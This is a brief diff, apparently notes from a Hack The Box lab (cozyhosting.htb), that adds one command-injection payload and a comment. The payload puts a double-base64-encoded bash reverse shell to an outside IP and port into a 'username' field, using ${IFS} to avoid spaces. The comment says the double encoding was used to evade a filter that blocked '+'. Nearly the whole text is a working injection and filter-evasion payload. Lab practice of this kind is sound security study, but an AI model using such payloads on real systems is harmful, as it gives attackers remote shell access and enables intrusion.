@@ -1,0 +1,6 @@
+host=cozyhosting.htb&username=;echo${IFS}'WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0eU1UVXZORFEwTkNBd1BpWXg='|base64${IFS}-d|base64${IFS}-d|bash;#
+
+
+--
+In my case, i was forced to double encoded my bash revshell because the first encoding contained '+' which was blocked.
+--
